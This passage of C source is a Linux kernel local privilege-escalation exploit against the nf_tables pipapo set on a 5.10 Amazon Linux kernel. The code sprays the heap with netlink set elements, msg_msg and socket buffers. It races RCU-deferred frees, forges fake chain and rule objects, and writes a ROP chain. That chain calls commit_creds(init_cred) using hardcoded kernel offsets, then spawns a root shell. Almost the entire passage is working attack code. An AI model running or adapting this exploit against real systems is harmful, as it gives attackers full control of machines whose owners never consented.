    nest_end(buf, &off, el);
    nest_end(buf, &off, els);
    msg_end(buf, h, &off); batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

/*
 * Build IPv6 key bytes (32 bytes: src_ipv6 ++ dst_ipv6).
 * For filler N: src = 2001:db8:0:0:0:0:XXYY:0, dst = same
 *   where XX = N >> 8, YY = N & 0xFF
 */
static void build_filler_key(uint8_t *key, int idx) {
    memset(key, 0, 32);
    /* src_ipv6 = 2001:0db8::XXYY:0000 */
    key[0] = 0x20; key[1] = 0x01;
    key[2] = 0x0d; key[3] = 0xb8;
    key[12] = (idx >> 8) & 0xFF;
    key[13] = idx & 0xFF;
    /* dst_ipv6 = same as src */
    memcpy(key + 16, key, 16);
}

static void build_filler_key_end(uint8_t *key, int idx) {
    memset(key, 0, 32);
    /* src_ipv6 end = 2001:0db8::XXYY:00FF */
    key[0] = 0x20; key[1] = 0x01;
    key[2] = 0x0d; key[3] = 0xb8;
    key[12] = (idx >> 8) & 0xFF;
    key[13] = idx & 0xFF;
    key[15] = 0xFF;
    /* dst_ipv6 end = same */
    memcpy(key + 16, key, 16);
}

/* Target key: src=::1, dst=::1 (point range) */
static void build_target_key(uint8_t *key) {
    memset(key, 0, 32);
    key[15] = 1;   /* src = ::1 */
    key[31] = 1;   /* dst = ::1 */
}

static int add_fillers(int fd, char *buf, int count) {
    int sent = 0;
    uint8_t key[32], key_end[32];

    while (sent < count) {
        int off = 0;
        batch_begin(buf, &off);
        int chunk = 0;
        for (; chunk < BATCH_CHUNK && sent + chunk < count; chunk++) {
            int idx = sent + chunk;
            int h = off;
            msg_hdr(buf, &off, NFT_MSG_NEWSETELEM,
                    NLM_F_CREATE | (chunk == BATCH_CHUNK-1 || sent+chunk == count-1 ? NLM_F_ACK : 0),
                    NFPROTO_INET);
            nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_TABLE, "t");
            nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_SET, "s");
            int els = nest_start(buf, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
            int el = nest_start(buf, &off, 1);
            /* Key */
            int k = nest_start(buf, &off, NFTA_SET_ELEM_KEY);
            build_filler_key(key, idx);
            nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
            nest_end(buf, &off, k);
            /* Key end */
            int ke = nest_start(buf, &off, NFTA_SET_ELEM_KEY_END);
            build_filler_key_end(key_end, idx);
            nla_put(buf, &off, NFTA_DATA_VALUE, key_end, 32);
            nest_end(buf, &off, ke);
            /* Data */
            { int dt = nest_start(buf, &off, NFTA_SET_ELEM_DATA);
              uint64_t dval = 0xDEADBEEFCAFE0000ULL | (idx & 0xFFFF);
              nla_put(buf, &off, NFTA_DATA_VALUE, &dval, 8);
              nest_end(buf, &off, dt); }
            /* Timeout differs from set default (3600000) to force TIMEOUT extension.
             * Without this: 96B (KEY+KEY_END+DATA+EXPIRATION) → kmalloc-cg-96
             * With this: 104B (+TIMEOUT) → kmalloc-cg-128, same cache as target */
            nla_put_u64(buf, &off, NFTA_SET_ELEM_TIMEOUT, 3599999ULL);
            nest_end(buf, &off, el);
            nest_end(buf, &off, els);
            msg_end(buf, h, &off);
            if (off > BUF_SIZE - 4096) break;
        }
        batch_end(buf, &off);
        int r = nl_do(fd, buf, off);
        if (r) { printf("[!] Filler batch at %d failed: %d\n", sent, r); return r; }
        sent += chunk;
        if (sent % 5000 == 0 || sent >= count)
            printf("[+] Fillers: %d/%d\n", sent, count);
    }
    return 0;
}

/* Padding elements: use 2001:db9:: prefix, NO per-element timeout →
 * 96 bytes (KEY+KEY_END+DATA+EXPIRATION) → kmalloc-cg-96.
 * These inflate pipapo lt_size without polluting kmalloc-cg-128. */
static void build_padding_key(uint8_t *key, int idx) {
    memset(key, 0, 32);
    key[0] = 0x20; key[1] = 0x01;
    key[2] = 0x0d; key[3] = 0xb9;  /* 2001:0db9:: */
    key[12] = (idx >> 8) & 0xFF;
    key[13] = idx & 0xFF;
    memcpy(key + 16, key, 16);
}

static void build_padding_key_end(uint8_t *key, int idx) {
    memset(key, 0, 32);
    key[0] = 0x20; key[1] = 0x01;
    key[2] = 0x0d; key[3] = 0xb9;
    key[12] = (idx >> 8) & 0xFF;
    key[13] = idx & 0xFF;
    key[15] = 0xFF;
    memcpy(key + 16, key, 16);
}

static int add_padding(int fd, char *buf, int count) {
    int sent = 0;
    uint8_t key[32], key_end[32];

    while (sent < count) {
        int off = 0;
        batch_begin(buf, &off);
        int chunk = 0;
        for (; chunk < BATCH_CHUNK && sent + chunk < count; chunk++) {
            int idx = sent + chunk;
            int h = off;
            msg_hdr(buf, &off, NFT_MSG_NEWSETELEM,
                    NLM_F_CREATE | (chunk == BATCH_CHUNK-1 || sent+chunk == count-1 ? NLM_F_ACK : 0),
                    NFPROTO_INET);
            nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_TABLE, "t");
            nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_SET, "s");
            int els = nest_start(buf, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
            int el = nest_start(buf, &off, 1);
            int k = nest_start(buf, &off, NFTA_SET_ELEM_KEY);
            build_padding_key(key, idx);
            nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
            nest_end(buf, &off, k);
            int ke = nest_start(buf, &off, NFTA_SET_ELEM_KEY_END);
            build_padding_key_end(key_end, idx);
            nla_put(buf, &off, NFTA_DATA_VALUE, key_end, 32);
            nest_end(buf, &off, ke);
            { int dt = nest_start(buf, &off, NFTA_SET_ELEM_DATA);
              uint64_t dval = 0;
              nla_put(buf, &off, NFTA_DATA_VALUE, &dval, 8);
              nest_end(buf, &off, dt); }
            /* NO NFTA_SET_ELEM_TIMEOUT → uses set default 3600000ms →
             * no TIMEOUT extension → 96B → kmalloc-cg-96 */
            nest_end(buf, &off, el);
            nest_end(buf, &off, els);
            msg_end(buf, h, &off);
            if (off > BUF_SIZE - 4096) break;
        }
        batch_end(buf, &off);
        int r = nl_do(fd, buf, off);
        if (r) { printf("[!] Padding batch at %d failed: %d\n", sent, r); return r; }
        sent += chunk;
        if (sent % 10000 == 0 || sent >= count)
            printf("[+] Padding: %d/%d\n", sent, count);
    }
    return 0;
}

static int add_target(int fd, char *buf) {
    uint8_t key[32];
    int off = 0; batch_begin(buf, &off);
    int h = off;
    msg_hdr(buf, &off, NFT_MSG_NEWSETELEM, NLM_F_CREATE|NLM_F_ACK, NFPROTO_INET);
    nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_TABLE, "t");
    nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_SET, "s");
    int els = nest_start(buf, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
    int el = nest_start(buf, &off, 1);
    /* Key: (::1, ::1) */
    int k = nest_start(buf, &off, NFTA_SET_ELEM_KEY);
    build_target_key(key);
    nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
    nest_end(buf, &off, k);
    /* Key end: same (point range) */
    int ke = nest_start(buf, &off, NFTA_SET_ELEM_KEY_END);
    nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
    nest_end(buf, &off, ke);
    /* Data: recognizable pattern */
    { int dt = nest_start(buf, &off, NFTA_SET_ELEM_DATA);
      uint64_t dval = 0xAAAAAAAAAAAAAAAAULL;
      nla_put(buf, &off, NFTA_DATA_VALUE, &dval, 8);
      nest_end(buf, &off, dt); }
    /* Short timeout: 2 seconds */
    nla_put_u64(buf, &off, NFTA_SET_ELEM_TIMEOUT, 2000ULL);
    /* USERDATA: pushes target to kmalloc-cg-512 (separate from fillers in -128).
     * 512-byte aligned: byte 0 (genmask)=0, byte 8 (EXPRESSIONS)=0 → no crash.
     * offset[EXPIRATION]=0xFF → ext+255 stays WITHIN 512B object → mtext → not expired */
    { uint8_t udata[TARGET_UDATA_LEN];
      memset(udata, 0xCC, TARGET_UDATA_LEN);
      nla_put(buf, &off, NFTA_SET_ELEM_USERDATA, udata, TARGET_UDATA_LEN);
    }
    nest_end(buf, &off, el);
    nest_end(buf, &off, els);
    msg_end(buf, h, &off); batch_end(buf, &off);
    return nl_do(fd, buf, off);
}


static uint64_t now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000ULL + ts.tv_nsec / 1000;
}

/* Commit thread — runs nft_commit on CPU 0 so call_rcu(kfree) enqueues on CPU 0.
 * The main thread on CPU 0 sprays concurrently via msgsnd syscalls.
 * During vmalloc's cond_resched, the scheduler switches between them. */
struct commit_ctx {
    volatile int go;
    volatile int done;
    volatile int result;
    volatile uint64_t t_start;
    volatile uint64_t t_done;
    int fd;
    int idx;
    int use_verdict_set;  /* If nonzero, add dummy to set "v" (verdict map) */
};

static void *commit_fn(void *arg) {
    struct commit_ctx *ctx = (struct commit_ctx *)arg;
    /* Build commit message in thread-local buffer */
    char *cbuf = (char *)malloc(4096);
    if (!cbuf) { ctx->result = -ENOMEM; ctx->done = 1; return NULL; }

    uint8_t key[32];
    int off = 0;
    batch_begin(cbuf, &off);
    int h = off;
    msg_hdr(cbuf, &off, NFT_MSG_NEWSETELEM, NLM_F_CREATE|NLM_F_ACK, NFPROTO_INET);
    nla_put_str(cbuf, &off, NFTA_SET_ELEM_LIST_TABLE, "t");
    nla_put_str(cbuf, &off, NFTA_SET_ELEM_LIST_SET,
                ctx->use_verdict_set ? "v" : "s");
    int els = nest_start(cbuf, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
    int el = nest_start(cbuf, &off, 1);
    memset(key, 0, 32);
    key[0] = 0xfc; key[13] = (ctx->idx >> 8) & 0xFF; key[14] = ctx->idx & 0xFF;
    memcpy(key + 16, key, 16);
    int k = nest_start(cbuf, &off, NFTA_SET_ELEM_KEY);
    nla_put(cbuf, &off, NFTA_DATA_VALUE, key, 32);
    nest_end(cbuf, &off, k);
    int ke = nest_start(cbuf, &off, NFTA_SET_ELEM_KEY_END);
    nla_put(cbuf, &off, NFTA_DATA_VALUE, key, 32);
    nest_end(cbuf, &off, ke);
    if (ctx->use_verdict_set) {
        /* Verdict data: NFT_CONTINUE */
        int dt = nest_start(cbuf, &off, NFTA_SET_ELEM_DATA);
        int vd = nest_start(cbuf, &off, 2 /* NFTA_DATA_VERDICT */);
        nla_put_u32(cbuf, &off, 1 /* NFTA_VERDICT_CODE */, 0xFFFFFFFF);
        nest_end(cbuf, &off, vd);
        nest_end(cbuf, &off, dt);
    } else {
        int dt = nest_start(cbuf, &off, NFTA_SET_ELEM_DATA);
        uint64_t dval = 0; nla_put(cbuf, &off, NFTA_DATA_VALUE, &dval, 8);
        nest_end(cbuf, &off, dt);
    }
    nla_put_u64(cbuf, &off, NFTA_SET_ELEM_TIMEOUT, 3600000ULL);
    nest_end(cbuf, &off, el);
    nest_end(cbuf, &off, els);
    msg_end(cbuf, h, &off);
    batch_end(cbuf, &off);

    while (!ctx->go)
        sched_yield();  /* yield instead of tight spin */

    ctx->t_start = now_us();
    ctx->result = nl_do(ctx->fd, cbuf, off);
    ctx->t_done = now_us();
    ctx->done = 1;
    free(cbuf);
    return NULL;
}

/* GP forcer thread — calls MEMBARRIER_CMD_GLOBAL (= synchronize_rcu) on CPU 1
 * to force RCU grace period completion. After synchronize_rcu returns, the GP
 * has completed, and kfree callbacks on CPU 0 are eligible to fire (they fire
 * at the next softirq/timer tick on CPU 0, within ~1ms with HZ=1000). */
struct gp_ctx {
    volatile int go;
    volatile int stop;
    volatile int done;
    volatile int count;
    volatile uint64_t t_start;
    volatile uint64_t t_done;
};

static void *gp_forcer_fn(void *arg) {
    struct gp_ctx *ctx = (struct gp_ctx *)arg;
    while (!ctx->go && !ctx->stop)
        ;

    ctx->t_start = now_us();
    /* MEMBARRIER_CMD_GLOBAL calls synchronize_rcu() — waits for a full GP.
     * This forces the GP started by pipapo_gc's call_rcu to complete. */
    int r = syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1);
    ctx->t_done = now_us();
    ctx->count = 1;

    /* Keep calling to ensure any late GPs also complete */
    while (!ctx->stop) {
        r = syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1);
        ctx->count++;
        if (r < 0) break;
    }
    ctx->done = 1;
    return NULL;
}

/* Flood thread — sends IPv6 UDP packets to ::1 triggering pipapo lookups */
struct flood_ctx {
    volatile int stop;
    volatile long sent;
    volatile long recv_ok;
    volatile long hit;
    volatile long miss;
    volatile long changed;
    uint64_t changed_vals[256];
    volatile int n_unique_vals;
    /* Debug: record raw recv values during commit window, time-gated */
    uint64_t raw_vals[4096];
    uint64_t raw_ts[4096]; /* timestamps relative to commit start */
    volatile int n_raw;
    /* Time-bucketed counters (each 2ms bucket from 0-20ms) */
    volatile long bucket_miss[10];
    volatile long bucket_changed[10];
    volatile long bucket_hit[10];
    volatile int recording;
    volatile uint64_t t_base; /* commit start time for relative timestamps */
    volatile uint64_t record_after_us; /* only record after this many us from t_base */
};

static void *flood_fn(void *arg) {
    struct flood_ctx *ctx = (struct flood_ctx *)arg;

    int sfd = socket(AF_INET6, SOCK_DGRAM, 0);
    int rfd = socket(AF_INET6, SOCK_DGRAM, 0);
    if (sfd < 0 || rfd < 0) { perror("flood socket"); return NULL; }

    /* Bind receiver to port 9999 on ::1 */
    struct sockaddr_in6 raddr = {
        .sin6_family = AF_INET6,
        .sin6_port = htons(9999),
        .sin6_addr = IN6ADDR_LOOPBACK_INIT,
    };
    if (bind(rfd, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
        perror("flood bind");
        close(sfd); close(rfd); return NULL;
    }
    struct timeval tv = { .tv_sec = 0, .tv_usec = 1000 };
    setsockopt(rfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    /* Bind sender to ::1 explicitly */
    struct sockaddr_in6 saddr = {
        .sin6_family = AF_INET6,
        .sin6_addr = IN6ADDR_LOOPBACK_INIT,
    };
    bind(sfd, (struct sockaddr *)&saddr, sizeof(saddr));

    struct sockaddr_in6 dst = {
        .sin6_family = AF_INET6,
        .sin6_port = htons(9999),
        .sin6_addr = IN6ADDR_LOOPBACK_INIT,
    };

    char pkt[32], rbuf[64];
    memset(pkt, 0xBB, sizeof(pkt));

    while (!ctx->stop) {
        int sr = sendto(sfd, pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&dst, sizeof(dst));
        if (sr > 0) ctx->sent++;
        /* Yield every 8 sends to report RCU quiescent state on CPU 1 */
        if ((ctx->sent & 7) == 0)
            sched_yield();

        for (int drain = 0; drain < 8; drain++) {
            int n = recv(rfd, rbuf, sizeof(rbuf), MSG_DONTWAIT);
            if (n < 0) break;
            ctx->recv_ok++;
            if (n >= 8) {
                uint64_t val;
                memcpy(&val, rbuf, 8);
                /* Record raw values during commit window (time-gated) */
                if (ctx->recording) {
                    uint64_t elapsed = now_us() - ctx->t_base;
                    if (elapsed >= ctx->record_after_us && ctx->n_raw < 4096) {
                        int idx = ctx->n_raw;
                        ctx->raw_vals[idx] = val;
                        ctx->raw_ts[idx] = elapsed;
                        ctx->n_raw++;
                    }
                    /* Update time-bucketed counters (2ms buckets, 0-20ms) */
                    int bucket = (int)(elapsed / 2000);
                    if (bucket >= 0 && bucket < 10) {
                        if (val == 0xBBBBBBBBBBBBBBBBULL)
                            ctx->bucket_miss[bucket]++;
                        else if (val == 0xAAAAAAAAAAAAAAAAULL)
                            ctx->bucket_hit[bucket]++;
                        else
                            ctx->bucket_changed[bucket]++;
                    }
                }
                if (val == 0xBBBBBBBBBBBBBBBBULL)
                    ctx->miss++;
                else if (val == 0xAAAAAAAAAAAAAAAAULL)
                    ctx->hit++;
                else if (val == 0)
                    ctx->changed++; /* zero = our fill, count but don't record */
                else {
                    ctx->changed++;
                    if (ctx->n_unique_vals < 256) {
                        int dup = 0;
                        for (int j = 0; j < ctx->n_unique_vals; j++)
                            if (ctx->changed_vals[j] == val) { dup = 1; break; }
                        if (!dup)
                            ctx->changed_vals[ctx->n_unique_vals++] = val;
                    }
                }
            }
        }
    }
    close(sfd); close(rfd);
    return NULL;
}


/* CPU 1 spray thread — catches kfree from GC workqueue running on CPU 1.
 * Without this, only kfree on CPU 0 is reclaimable (spray on CPU 0).
 * GC workqueue runs on random CPU, so ~50% of kfrees go to CPU 1. */
struct spray1_ctx {
    volatile int go;
    volatile int stop;
    volatile int go_phase2;  /* Set when commit starts — gates phase 2 */
    volatile long count;
    volatile int phase;  /* 1 = filling main, 2 = waiting, 3 = filling reclaim */
    int *qids;
    int n_queues;
    int *reclaim_qids;   /* Extra queues for pure allocation (no drain) */
    int n_reclaim;
};

static void *spray1_fn(void *arg) {
    struct spray1_ctx *ctx = (struct spray1_ctx *)arg;
    struct { long mtype; char mtext[SPRAY_MSG_DSIZE]; } spray_msg;
    spray_msg.mtype = 0x42;
    for (int i = 0; i < SPRAY_MSG_DSIZE; i++)
        spray_msg.mtext[i] = 0x41 + i;

    while (!ctx->go && !ctx->stop)
        ;

    /* Phase 1: Fast fill — exhaust existing slab pages.
     * This puts ~200 msgs per queue × 1024 queues = ~204K allocations.
     * After this, per-cpu freelist is empty. */
    ctx->phase = 1;
    int qi = 0;
    int phase1_sent = 0;
    while (!ctx->stop) {
        if (msgsnd(ctx->qids[qi], &spray_msg, SPRAY_MSG_DSIZE, IPC_NOWAIT) == 0) {
            ctx->count++;
            phase1_sent++;
        }
        qi = (qi + 1) % ctx->n_queues;
        if (qi == 0) {
            if (phase1_sent == 0)
                break; /* All queues full */
            phase1_sent = 0;
            sched_yield();
        }
    }

    ctx->phase = 2;
    /* Phase 2: Wait for commit to start.  Phase 1 saturated SLUB cache.
     * We must NOT allocate yet — if we fill reclaim queues now, there's
     * no allocation capacity during the vmalloc window. */
    while (!ctx->go_phase2 && !ctx->stop)
        ;

    ctx->phase = 3;
    /* Phase 3: Pure allocation into reclaim queues (NO drain/free).
     * Commit is running pipapo_gc → call_rcu(kfree) → vmalloc.
     * When kfree fires, target page becomes ONLY partial on CPU 0.
     * These allocs exhaust c->slab leftovers then pick the freed page.
     * CRITICAL: no drain/free here = no SLUB freelist pollution. */
    qi = 0;
    while (!ctx->stop && ctx->reclaim_qids) {
        if (msgsnd(ctx->reclaim_qids[qi], &spray_msg, SPRAY_MSG_DSIZE, IPC_NOWAIT) == 0)
            ctx->count++;
        qi = (qi + 1) % ctx->n_reclaim;
    }
    return NULL;
}

/* ====== Phase 3: Code execution via nft_immediate OOB dreg ====== */

/* Exact Linux 5.10.245-245.983.amzn2.x86_64 offsets from _stext. */
#define OFF_COMMIT_CREDS        0x000c71c0ULL
#define OFF_INIT_CRED           0x0166b3a0ULL
#define OFF_POP_RDI_RET         0x0007ed40ULL
#define OFF_SWAPGS_IRETQ        0x00a01021ULL /* swapgs_restore...+0x51 */

/* Exact offsets from the nf_tables module .text base. */
#define OFF_NFT_DO_CHAIN        0x00000140ULL
#define OFF_NFT_IMMEDIATE_EVAL  0x000159b0ULL
#define OFF_NFT_IMM_OPS          0x00027000ULL /* .rodata + 0xf80 */
#define NFT_TABLES_CORE_SIZE    0x00045000ULL

static uint64_t g_nft_text = 0;

static uint64_t user_cs, user_ss, user_rflags, user_rsp;
static void save_state(void) {
    asm volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
    );
}

static void shell(void) {
    if (getuid() == 0) {
        printf("[!!!] GOT ROOT!\n");
        execl("/bin/sh", "sh", NULL);
    }
    printf("[-] Not root (uid=%d)\n", getuid());
    exit(1);
}

/*
 * Build the fake chain mtext buffer for a msg_msg at address `base`.
 * The mtext starts at base+48 (after msg_msg header).
 *
 * Layout within mtext (464 bytes):
 *   [0-7]:    fake chain: blob_gen_0 = base+48+16  (→ blob)
 *   [8-15]:   fake chain: blob_gen_1 = base+48+16  (→ blob)
 *   [16-23]:  blob header: size = 256
 *   [24-31]:  rule_dp: is_last=0, dlen=64 (2 exprs × 32B) → u64 = 0x80
 *   [32-63]:  expr1 (verdict reset): ops→fake_ops, dreg=0, dlen=4, data=NFT_CONTINUE
 *   [64-95]:  expr2 (OOB ROP write): ops→fake_ops, dreg=54, dlen=136, data=ROP start
 *   [96-103]: sentinel rule_dp: is_last=1 → u64 = 1
 *   [104+]:   ROP chain continuation (read as part of expr2's memcpy source)
 *   [300-319]: fake nft_expr_ops: eval=nft_immediate_eval, select_ops=0, size=32
 */
static void build_fake_chain_mtext(uint8_t *mtext, uint64_t base, uint64_t kbase) {
    memset(mtext, 0, SPRAY_MSG_DSIZE);

    const uint64_t mtext_base = base + 48; /* struct msg_msg header */
    const uint64_t rules_addr = mtext_base + 16;
    const uint64_t rule_addr  = mtext_base + 32;
    const uint64_t ops_addr   = mtext_base + 320;

    if (!g_nft_text)
        die("nf_tables module text base is unavailable");

    /* Linux 5.10 struct nft_chain: rules_gen_0 at +0, rules_gen_1 at +8. */
    *(uint64_t *)&mtext[0] = rules_addr;
    *(uint64_t *)&mtext[8] = rules_addr;

    /* rules_gen_* points to a NULL-terminated array of struct nft_rule *. */
    *(uint64_t *)&mtext[16] = rule_addr;
    *(uint64_t *)&mtext[24] = 0;

    /* Linux 5.10 struct nft_rule: list(16), packed handle/genmask/dlen/udata(8),
     * then data at +24.  dlen is bits 44..55, so 64 bytes is 64 << 44. */
    *(uint64_t *)&mtext[48] = 64ULL << 44;

    /* expr1 at rule+24: reset verdict register to NFT_CONTINUE. */
    *(uint64_t *)&mtext[56] = ops_addr;
    *(uint32_t *)&mtext[64] = 0xffffffffU;
    mtext[72] = 0;  /* dreg = verdict */
    mtext[73] = 4;  /* dlen */

    /* expr2 at mtext+88.  Its private data at mtext+96 is the 136-byte source
     * copied to regs->data[88], i.e. rsp+0x1a8, the first saved register. */
    *(uint64_t *)&mtext[88] = ops_addr;
    *(uint64_t *)&mtext[96]  = 0; /* saved r15 */
    *(uint64_t *)&mtext[104] = 0; /* saved r14 */
    *(uint64_t *)&mtext[120] = 0; /* saved r12 */
    *(uint64_t *)&mtext[128] = 0; /* saved rbp */
    *(uint64_t *)&mtext[136] = 0; /* saved rbx */
    mtext[112] = 88;  /* dreg -> rsp+0x1a8 */
    mtext[113] = 136; /* dlen -> through the iret frame */

    *(uint64_t *)&mtext[144] = kbase + OFF_POP_RDI_RET;
    *(uint64_t *)&mtext[152] = kbase + OFF_INIT_CRED;
    *(uint64_t *)&mtext[160] = kbase + OFF_COMMIT_CREDS;
    *(uint64_t *)&mtext[168] = kbase + OFF_SWAPGS_IRETQ;
    *(uint64_t *)&mtext[176] = 0; /* pop rax padding */
    *(uint64_t *)&mtext[184] = 0; /* pop rdi padding */
    *(uint64_t *)&mtext[192] = (uint64_t)shell;
    *(uint64_t *)&mtext[200] = user_cs;
    *(uint64_t *)&mtext[208] = user_rflags;
    *(uint64_t *)&mtext[216] = user_rsp;
    *(uint64_t *)&mtext[224] = user_ss;

    /* Self-contained struct nft_expr_ops.  Linux 5.10 layout:
     * eval(+0), clone(+8), size(+16). */
    *(uint64_t *)&mtext[320] = g_nft_text + OFF_NFT_IMMEDIATE_EVAL;
    *(uint64_t *)&mtext[328] = 0;
    *(uint32_t *)&mtext[336] = 32;
}

/*
 * Build skb payload for Phase 3 reclaim of verdict map element.
 * Controls ext header offsets so pipapo_lookup returns our fake verdict.
 * The verdict points to the fake chain in a msg_msg at chain_addr.
 */
static void build_skb_payload(uint8_t *payload, int payload_len, uint64_t chain_addr) {
    memset(payload, 0, payload_len);

    payload[0] = 0;      /* genmask = 0 → active */
    payload[3] = 16;     /* offset[DATA] = 16 → verdict at byte 16 */
    payload[6] = 160;    /* offset[EXPIRATION] = 160 */
    payload[8] = 0;      /* offset[EXPRESSIONS] = 0 */

    /* Verdict at offset 16: NFT_GOTO to fake chain */
    *(uint32_t *)&payload[16] = 0xFFFFFFFC;   /* NFT_GOTO = -4 */
    *(uint32_t *)&payload[20] = 0;
    *(uint64_t *)&payload[24] = chain_addr;

    /* Expiration at offset 160: far future */
    *(uint64_t *)&payload[160] = 0x7FFFFFFFFFFFFFFFULL;
}

/* SKB spray via AF_UNIX SOCK_DGRAM socketpairs.
 * The skb data area (kmalloc-cg-512) contains our controlled payload at byte 0.
 * Max payload for kmalloc-cg-512: 192 bytes (512 - 320 skb_shared_info). */
/* SKB payload for kmalloc-cg-512: max 192 bytes (512 - 320 skb_shared_info).
 * The skb holds the controlled ext header + verdict. The fake chain + ROP data
 * lives in a separate msg_msg at the heap_leak address. */
#define SKB_SPRAY_PAYLOAD  192
#define SKB_SPRAY_COUNT    128

static int skb_spray_fds[SKB_SPRAY_COUNT][2];  /* socketpairs */

static int skb_spray_init(void) {
    for (int i = 0; i < SKB_SPRAY_COUNT; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, skb_spray_fds[i]) < 0) {
            perror("skb socketpair");
            return -1;
        }
        /* Set receive buffer small to prevent kernel from dropping */
        int rcvbuf = 512;
        setsockopt(skb_spray_fds[i][1], SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    }
    return 0;
}

static int skb_spray_send(uint8_t *payload, int payload_len) {
    int sent = 0;
    for (int i = 0; i < SKB_SPRAY_COUNT; i++) {
        if (write(skb_spray_fds[i][0], payload, payload_len) == payload_len)
            sent++;
    }
    return sent;
}

static void skb_spray_free(void) {
    for (int i = 0; i < SKB_SPRAY_COUNT; i++) {
        close(skb_spray_fds[i][0]);
        close(skb_spray_fds[i][1]);
    }
}

/* ====== Normal-cache reclaim adaptation ======
 *
 * nft_set_elem_init() uses GFP_KERNEL on this build.  msg_msg and AF_UNIX
 * skb data use GFP_KERNEL_ACCOUNT, so they live in kmalloc-cg-512 and cannot
 * reclaim the target.  The objects below are normal kmalloc-512 objects:
 *
 *   - an nft_rule with no expressions and 256 bytes of rule userdata is
 *     24 + 1 + 256 = 281 bytes, hence kmalloc-512;
 *   - a pipapo set element with 16-byte verdict/value data and 256 bytes of
 *     userdata is 369 bytes, also kmalloc-512.
 *
 * A leaked nft_rule base is used as the fake-chain object.  Its userdata
 * payload starts at +25; the fake chain is copied there.  The real
 * nft_imm_ops table is at module core offset 0x27000, so the fake chain does
 * not need a second heap object for ops.
 */
#define RULE_UDATA_LEN       256
#define RULE_FAKE_OFFSET     25
#define LEAK_RULE_COUNT      32768
#define FAKE_RULE_COUNT      32768
#define SPRAY_ELEM_BATCH     64
#define SPRAY_UDATA_LEN      256
#define SPRAY_DATA_LEN       16

struct spray_shared {
    volatile int ready;
    volatile int ready2;
    volatile int stop;
    volatile int phase;       /* 1=leak rules, 2=build fake rule, 3=verdict spray */
    volatile int err;
    volatile long count;
    uint64_t heap_leak;
    uint64_t text_base;
};

static void put_u32(uint8_t *p, uint32_t v) { memcpy(p, &v, sizeof(v)); }
static void put_u64(uint8_t *p, uint64_t v) { memcpy(p, &v, sizeof(v)); }

static void build_rule_leak_userdata(uint8_t *u) {
    for (int i = 0; i < RULE_UDATA_LEN; i++)
        u[i] = (uint8_t)(0x41 + i);
    /* The target reads expiration at rule+0xff.  Rule userdata starts at +25,
     * so this is userdata byte 0xe6.  Keep it far in the future. */
    put_u64(u + 0xe6, 0x7fffffffffffffffULL);
}

/* Build the 256-byte userdata payload of a rule at `rule_base`.
 * The fake chain starts at rule_base + 25 (userdata->data). */
static void build_rule_fake_userdata(uint8_t *u, uint64_t rule_base,
                                     uint64_t kbase) {
    memset(u, 0, RULE_UDATA_LEN);
    const uint64_t chain = rule_base + RULE_FAKE_OFFSET;
    const uint64_t rules = chain + 16;
    const uint64_t rule = chain + 32;
    const uint64_t ops = g_nft_text + OFF_NFT_IMM_OPS;

    /* struct nft_chain rules_gen_0/1 and NULL-terminated rule array. */
    put_u64(u + 0x00, rules);
    put_u64(u + 0x08, rules);
    put_u64(u + 0x10, rule);
    put_u64(u + 0x18, 0);

    /* struct nft_rule: list at +0, packed handle/genmask/dlen/udata at +16. */
    put_u64(u + 0x30, 64ULL << 44);

    /* expr1: set verdict to NFT_CONTINUE. */
    put_u64(u + 0x38, ops);
    put_u32(u + 0x40, 0xffffffffU);
    u[0x50] = 0;   /* dreg = NFT_REG_VERDICT */
    u[0x51] = 4;   /* dlen */

    /* expr2: copy the ROP source to regs->data[88]. */
    put_u64(u + 0x58, ops);
    put_u64(u + 0x60, 0);   /* saved r15 */
    put_u64(u + 0x68, 0);   /* saved r14 */
    put_u64(u + 0x70, 0);   /* saved r13 */
    put_u64(u + 0x78, 0);   /* saved r12 */
    put_u64(u + 0x80, 0);   /* saved rbp */
    put_u64(u + 0x88, 0);   /* saved rbx */
    u[0x70] = 88;           /* dreg -> rsp+0x1a8 */
    u[0x71] = 136;          /* dlen -> through the iret frame */

    put_u64(u + 0x90, kbase + OFF_POP_RDI_RET);
    put_u64(u + 0x98, kbase + OFF_INIT_CRED);
    put_u64(u + 0xa0, kbase + OFF_COMMIT_CREDS);
    put_u64(u + 0xa8, kbase + OFF_SWAPGS_IRETQ);
    put_u64(u + 0xb0, 0);   /* pop rax padding */
    put_u64(u + 0xb8, 0);   /* pop rdi padding */
    put_u64(u + 0xc0, (uint64_t)shell);
    put_u64(u + 0xc8, user_cs);
    put_u64(u + 0xd0, user_rflags);
    put_u64(u + 0xd8, user_rsp);
    put_u64(u + 0xe0, user_ss);
}

static int add_rule_batch(int fd, char *buf, int count,
                          const uint8_t *udata, int ulen) {
    int off = 0;
    batch_begin(buf, &off);
    for (int i = 0; i < count; i++) {
        int h = off;
        msg_hdr(buf, &off, NFT_MSG_NEWRULE,
                NLM_F_CREATE | NLM_F_APPEND |
                (i == count - 1 ? NLM_F_ACK : 0), NFPROTO_INET);
